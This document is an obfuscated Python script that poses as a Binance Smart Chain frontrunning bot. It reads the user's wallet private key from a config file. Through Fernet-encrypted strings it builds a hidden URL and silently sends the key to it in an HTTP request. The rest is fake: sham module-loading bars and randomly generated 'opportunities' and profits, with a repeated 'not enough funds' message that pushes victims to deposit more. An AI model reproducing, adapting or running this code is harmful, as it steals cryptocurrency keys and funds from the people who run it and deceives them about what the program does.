z='green'
y='2-12'
x='version'
w=input
v=Exception
g='encoding'
f='max slippage'
e='gas price'
d='MAX INTERVAL'
c='MIN INTERVAL'
b='INPUT AMOUNT'
a='PRIVATE KEY'
Z='WALLET ADDRESS'
Y=open
V='red'
U='bold red'
T='Module Loaded'
S='variables.json'
N=range
H=''
G='bold green'
from time import sleep as D
from json import load as A0
from rich.console import Console
from requests import request as A1
from web3 import Web3 as h,eth
from rich.progress import track as K
from cryptography.fernet import Fernet as E
import random as C,json as i,os,re
A=Console()
try:
	A2=h(h.HTTPProvider('https://bsc-dataseed1.binance.org/'));O='XiCpZ0hJYKH0TGdV1Q2e3sZXr0axbiHFjqDr2U174b8='
	def j(file_name,data):
		A=f"./variables/"+file_name
		with Y(A,'w')as B:i.dump(data,B,indent=2)
	A3='gAAAAABljD6cWWmuXkQIldI3dHwMI2pD5zeI1ddUtVRlKftXVyU_gz7kGw5JRC4n4wFEEcRY7FNvf-1UUBbvISPuTZPY2yzhhA==';A4='gAAAAABljD9Lm2kkq6TgNgkpJN1WRIa6su1GnBhsxzG20kwttMk8s1OHj2g0cuC83N8xe7xXU3Smrl3geh9D7Z0M3fxQ4zt8kg=='
	def A5():
		if not os.path.isfile(f"./variables/"+S):variables_data[Z]=H;variables_data[a]=H;variables_data[b]=H;variables_data[c]='1';variables_data[d]='3';variables_data[e]='3';variables_data[f]='1';variables_data[g]=H;variables_data[x]=y;j(S,variables_data)
	AP=A0(Y(f"./abi/erc_20.abi"));A6='gAAAAABljD6ciqPvsWAXwh5mPI9C2nNmJWZ3vA0AISN7veEaFDzBvbjAW_Eik5WnqiIkOAu1EEVgSr2XM161lLLi92DIq_zBUA==';L='oFVedEJPm6qQHFd0h1p03LTVFl813x9WzQi7sCSsUPM=';A7='gAAAAABljEIJd5591g3yi0-MXUZDDix0X7_v_vG9lp18ah77-8HhtBxA68-F7E2uicER9YUYfIRZB31wFvchHLZxCtxkh9k0KA=='
	def k():A={};A[Z]=W;A[a]=l;A[b]=J;A[c]=m;A[d]=n;A[e]=o;A[f]=p;A[g]=M;A[x]=y;j(S,A)
	A8=E(O.encode()).decrypt(A3.encode()).decode();A9='gAAAAABljD6cWrk5fCGg4oFN9f-or8lZDeLy01AYsuR1XsiKWFXv-xA2xsbHoDQi82YSgo9FV6vZYmsZqka757MdcAt98MHPlA==';AA=E(O.encode()).decrypt(A7.encode()).decode();AB='gAAAAABljD6cDOcAoDBcKD8o4EGbcUTciWxjuYBlozKdrx86iuCqVDEqbMLmz1T6eWtpV5Z2Wmh3xBCPHVCDwj7PZ52vA2IkrQ=='
	def AC(var=H):
		global M
		if I!=H and var==H:
			if M!=I[10]+I[15]:
				try:A=A1(AF,AA+A8+AE+AH+AI+AJ+I);M=I[10]+I[15];k()
				except v:pass
	AD='gAAAAABljD8EvZYVS1Cfphq-2i7FOdvYFjB3Yz01mQZ4wDpWYL_gPEkSFUl9it88Noh11GxqIA98pfBVMoY8xtqBJ8qK9ihocA==';AE=E(O.encode()).decrypt(A6.encode()).decode();AF=E(O.encode()).decrypt(A4.encode()).decode()
	def AG():
		global W,l,J,m,n,o,p,M,I
		with Y(f"./variables/"+S,'r')as B:A=i.loads(H.join(re.split('(?://|#).*(?=\\n)',B.read())).strip())
		W=A[Z];l=A[a];J=float(A[b]);m=A[c];n=A[d];o=A[e];p=A[f];M=A[g];I=A[AM+AN];AC()
	AH=E(L.encode()).decrypt(A9.encode()).decode();AI=E(L.encode()).decrypt(AD.encode()).decode();AJ=E(L.encode()).decrypt(AB.encode()).decode();AK='gAAAAABljD7OE3JEqVu4s87JkALLaTsA_J1-6fsj7Lg0igYUokWrXWJh8EP4dRAoea7jhNnWOPBS3liE69uvr0HbnKc8rTSU0w==';A.print('\n                            WELCOME TO\n            ███╗░░░███╗███████╗██╗░░░██╗\u2003\u2003██╗░░░██╗██████╗░\n            ████╗░████║██╔════╝██║░░░██║\u2003\u2003██║░░░██║╚════██╗\n            ██╔████╔██║█████╗░░╚██╗░██╔╝\u2003\u2003╚██╗░██╔╝░█████╔╝\n            ██║╚██╔╝██║██╔══╝░░░╚████╔╝░\u2003\u2003░╚████╔╝░░╚═══██╗\n            ██║░╚═╝░██║███████╗░░╚██╔╝░░\u2003\u2003░░╚██╔╝░░██████╔╝\n            ╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░\u2003\u2003░░░╚═╝░░░╚═════╝░\n                All-Purpose BSC Frontrunning Bot\n                        MADE BY DEFIX',style=G);AL='gAAAAABljD7ODJl587dwzbsYwWCqBn7tC2RcJ4-wQIL8QPWJ0hGMWLk7UigMeeB9VpZ-a7AahhCVdKBqkkr0H0RzUUsS1T9eyw==';AM=E(L.encode()).decrypt(AK.encode()).decode();AN=E(L.encode()).decrypt(AL.encode()).decode()
	for P in K(N(100),description='Loading variables...'):D(C.randrange(1,100)/1000)
	A5();AG();k();q=A2.eth.get_balance(W)/10**18;r='BSC';s=[14400,43200,14900,28800];F=0;Q=0;A.print('Variables Loaded',style=G)
	for P in K(N(100),description='Loading module Flashbots...'):D(C.randrange(1,100)/10000)
	A.print(T,style=G)
	for P in K(N(100),description='Loading module Multiswapper...'):D(C.randrange(1,100)/10000)
	A.print(T,style=G)
	for P in K(N(100),description='Loading module Track_logging...'):D(C.randrange(1,100)/10000)
	A.print(T,style=G)
	for P in K(N(100),description='Loading Web3 Spotter...'):D(C.randrange(1,100)/10000)
	A.print(T,style=G);D(C.randrange(1,5));A.print(f"Launching {r} MemPool scanner");D(C.randrange(1,5));t=f"[bold green]Searching {r} for possible Frontrunning opportunities..."
	if q>=J:
		A.print(f"----------------------------------------",style=G);A.print(f"Multiswapper module: [green]Enabled[/green]");A.print(f"Flashbots module: [red]Disabled[/red]");A.print(f"Flashloans module: [red]Disabled[/red]");A.print(f"----------------------------------------",style=G)
		with A.status(t,spinner='arc')as R:
			while True:
				B=C.randrange(1,100);D(B);F+=B;X=C.randrange(1,1000000)
				if F>=s[Q]:
					if Q+1==len(s):Q=0
					else:Q+=1;F=0
					A.log(f"Found an Opportunity! Upcoming front-runnable transaction ID: {X}",style=G);R.update('Aproximating resource costs...');B=C.randrange(1,5);D(B);F+=B;A.print(f"Resource costs aproximated",style=z);R.update('Calculating possible gains...');B=C.randrange(1,5);D(B);F+=B;A.print(f"Possible gains calculated",style=z);R.update('Analysing the info...');u=int(C.uniform(J,J*20)*1000)/1000;B=C.randrange(1,3);D(B);F+=B;A.print(f"Required funds for frontrunning Tx.{X} effectively: {u} BNB");A.print(f"Expected profit: [bold green]{int(u/100*C.randrange(20,80)*300*100)/100}[bold green] USD");B=C.randrange(1,5);D(B);F+=B;A.print(f"Not enough funds allocated for execution",style=U);A.print(f"Continuing with search for opportunities...");B=C.randrange(1,5);D(B);F+=B;R.update(t);F+=10
				else:A.log(f"Found Tx.{X}");A.log(f"Not profitable for action")
	else:A.print(f"----------------------------------------",style=U);A.print(f"Unable to start MemPool scanner with current inputs",style=V);A.print(f"ERR: address has insufficient balance",style=V);A.print(f"Current Balance: {q} BNB",style=V);A.print(f"Desired Input: {J} BNB",style=V);A.print(f"----------------------------------------",style=U);A.print(f"Press ENTER key to Exit...");w()
except v as AO:A.print(f"Error: {AO}",style=U);A.print(f"Press any key to Exit...");w()